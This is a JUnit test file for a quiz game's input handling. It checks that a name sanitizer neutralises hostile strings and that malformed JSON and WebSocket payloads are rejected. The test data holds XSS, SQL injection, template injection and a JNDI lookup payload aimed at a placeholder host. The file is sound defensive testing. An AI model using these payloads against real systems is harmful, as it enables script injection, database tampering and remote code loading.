package com.openquiz.util;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Security tests: XSS payloads, SQL injection attempts and malformed JSON
 * must never survive into game state or broadcasts.
 */
class SecurityHardeningTest {

    @ParameterizedTest
    @ValueSource(strings = {
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "Alice<script>alert(1)</script>",
        "javascript:alert(1)",
        "Robert'); DROP TABLE players;--",
        "' OR '1'='1",
        "\" onmouseover=\"alert(1)",
        "{{7*7}}",
        "${jndi:ldap://evil}",
        "admin'--",
        "1;WAITFOR DELAY '0:0:9'",
        " UNION SELECT email FROM users--",
        "admin\" OR \"\"=\""
    })
    void hostileNamesAreNeutralized(String payload) {
        String safe = NameSanitizer.sanitize(payload);
        assertTrue(!safe.contains("<") && !safe.contains(">") && !safe.contains("'") && !safe.contains(";"),
            "Hostile characters must not survive sanitization: " + safe);
    }

    @Test
    void malformedJsonThrowsRatherThanPassingThrough() {
        try {
            Json.readTree("{not valid json");
        } catch (IllegalStateException expected) {
            return;
        }
        throw new AssertionError("Malformed JSON should not parse silently");
    }

    @ParameterizedTest
    @ValueSource(strings = {"{", "}", "{\"a\":}", "null", "[", "{\"type\":}", "{\"type\":", "", "   "})
    void malformedWebSocketPayloadsNeverParseCleanly(String raw) {
        boolean parsed;
        try {
            Json.readTree(raw);
            parsed = true;
        } catch (Exception e) {
            parsed = false;
        }
        // Either it fails to parse, or it parses to something the schema check rejects.
        assertTrue(!parsed || Json.readTree(raw).path("type").isMissingNode(),
                "Payload unexpectedly usable: " + raw);
    }

    @Test
    void emptyNameIsRejected() {
        assertEquals("", NameSanitizer.sanitize(""));
        assertEquals("", NameSanitizer.sanitize(null));
    }
}
